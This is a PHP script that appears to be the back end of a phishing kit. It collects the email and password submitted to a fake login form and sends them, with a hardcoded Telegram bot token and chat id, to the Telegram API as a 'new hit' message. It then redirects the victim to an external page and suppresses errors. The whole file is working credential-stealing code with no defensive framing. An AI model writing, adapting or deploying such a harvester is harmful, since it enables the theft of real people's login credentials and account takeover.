<?php
flush();
ob_start();
set_time_limit(0);
ob_get_contents();
error_reporting(0);
ob_implicit_flush(1);

$username = $_POST["text"];
$password = $_POST["password"];
$ch = $_POST['ch'];
date_default_timezone_set('Africa/Cairo');
$date = date("Y/m/d h:i:s");
// get ip
// info
$token = "5034021723:AAFJfYYwIOmnBFR8W67-iHaLcApUwFZ-cHQ";
$id = "1509776203";
$msg = "
π½π΄π π·πΈπ

π΄πΌπ°πΈπ» : `$username`
πΏπ°ππππΎππ³ : `$password`
";
$mesg = ['chat_id'=>$id,'text'=>$msg,'parse_mode'=>"markdown",'disable_web_page_preview'=>true];
$message = http_build_query($mesg);
file_get_contents("https://api.telegram.org/bot$token/sendMessage?".$message);
header('Location: http://u1536692.cp.regruhosting.ru/v.html');
?>